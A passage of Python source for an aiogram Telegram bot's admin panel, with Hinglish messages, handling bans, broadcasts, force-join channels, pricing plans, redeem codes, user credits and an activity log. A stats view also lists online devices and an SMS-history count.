        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unban ho gaya!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nJo message bhejni hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML",
    )


@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b> users...", parse_mode="HTML")
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{esc(msg.text)}"
                await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    try:
        await wait.delete()
    except Exception:
        pass
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
        reply_markup=back_kb,
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{esc(_VERSION)}</i>",
            parse_mode="HTML",
        )
    except Exception as e:
        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)


@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass


@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")
    devices = await get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{esc(dv['dev_name'][:20])}</b> — {em(EMOJI_FIRE, '🔥')} {esc(dv['fb_label'][:20])}")
    full = stats_text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(
        full,
        reply_markup=kb([(f"{sc('refresh')}", "admin:stats"), (f"{sc('back')}", "admin:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"
    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
        text += f"• {esc(ch.get('title', 'Channel'))} (<code>{esc(ch['id'])}</code>)\n  {req} | {esc(ch['link'])}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑", style="danger")],
        [
            InlineKeyboardButton(
                text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
                callback_data="owner:fj:toggle",
                style="success" if not fj.get("enabled") else "danger",
            )
        ],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n<i>Example: -1001234567890</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML",
    )


@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        ch_id = int((msg.text or "").strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid channel ID bhejo (numbers only, e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\nChannel/Group ka invite link bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML",
    )


@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = (msg.text or "").strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except Exception:
        title = "Channel"
    channels = [c for c in d.setdefault("force_join", {}).setdefault("channels", []) if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Channel Added!</b>\n\n{em(EMOJI_BELL, '📢')} {esc(title)}\n{em(EMOJI_GEAR, '🔗')} {esc(link)}",
        reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi hai!", show_alert=True)
        return
    rows = [[btn(ch.get("title", "Channel")[:25], f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑", style="danger")] for ch in channels]
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )


@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    d["force_join"]["channels"] = [c for c in d.get("force_join", {}).get("channels", []) if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq, state)


@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    await cq.answer(f"Force Join {'ENABLED' if fj['enabled'] else 'DISABLED'}!", show_alert=True)
    await owner_fj_menu(cq, state)


@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal Plans: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += (
            f"{i}. <b>{esc(plan['name'])}</b>\n"
            f"   {em(EMOJI_MONEY, '💰')} {esc(plan['price'])} {esc(plan.get('currency', 'INR'))} = {esc(plan['credits'])} credits\n"
            f"   {em(EMOJI_GEAR, '🔗')} {esc(plan['payment_link'])}\n\n"
        )
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/4')}: Plan ka naam bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML",
    )


@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=(msg.text or "").strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/4')}</b>\n\nPrice bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML",
    )


@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float((msg.text or "").strip())
        await state.update_data(plan_price=price)
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/4')}</b>\n\nKitne credits dena hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML",
    )


@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int((msg.text or "").strip())
        await state.update_data(plan_credits=credits)
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 4/4')}</b>\n\nPayment redirect link bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML",
    )


@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = (msg.text or "").strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link,
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n\n{em(EMOJI_STAR, '📋')} {esc(plan['name'])}",
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi hai!", show_alert=True)
        return
    rows = [[btn(plan["name"][:25], f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑", style="danger")] for plan in plans]
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )


@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    d["pricing"]["plans"] = [p for p in d.get("pricing", {}).get("plans", []) if p["id"] != plan_id]
    save(d)
    await cq.answer("🗑 Plan removed!")
    await owner_pricing_menu(cq, state)


@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')} Active" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')} Expired"
        text += f"<code>{esc(code)}</code> — {em(EMOJI_MONEY, '💰')}{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML",
    )


@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int((msg.text or "").strip())
        if credits <= 0:
            raise ValueError
        await state.update_data(gen_credits=credits)
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>\n\nKitni baar use ho sakta hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML",
    )


@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int((msg.text or "").strip())
        if uses < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo (1 ya zyada).", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}):
            break
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "uses_left": uses,
        "created_by": msg.from_user.id,
        "created_at": int(time.time()),
        "used_by": [],
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{esc(code)}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
        return
    rows = [[btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑", style="danger")] for code in list(codes.keys())[:20]]
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )


@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    d.get("redeem_codes", {}).pop(code, None)
    save(d)
    await cq.answer("🗑 Code deleted!")
    await owner_redeem_menu(cq, state)


@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int((msg.text or "").strip())
        await state.update_data(credit_uid=uid)
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits add karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int((msg.text or "").strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(
            uid,
            f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits mile hain!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> added to <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int((msg.text or "").strip())
        await state.update_data(deduct_uid=uid)
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits deduct karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int((msg.text or "").strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()
    if success:
        try:
            await msg.bot.send_message(
                uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits kat gaye.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> deducted from <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML",
        )
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User ke paas sirf <b>{get_user_credits(uid, d)}</b> credits hain.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML",
        )


@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})
    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁", style="success")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML",
    )


@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int((msg.text or "").strip())
        if credits < 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = credits
    d.setdefault("premium", {})["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge.",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    log_entries = d.get("activity_log", [])[-15:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi hai abhi tak.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = esc(entry.get("action", "unknown"))
            uid = entry.get("uid", 0)
            details = esc(entry.get("details", ""))
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)[:3950]
    await cq.message.edit_text(
        text,
        reply_markup=kb([(f"{sc('refresh')}", "owner:activity"), (f"{sc('back')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    total_entries = sum(len(v) for v in d.get("sms_history", {}).values())
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(
            force_join_text(missing),
            reply_markup=force_join_kb(missing),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
        return
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")


@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    credits = get_user_credits(cq.from_user.id, load())
    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)


@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
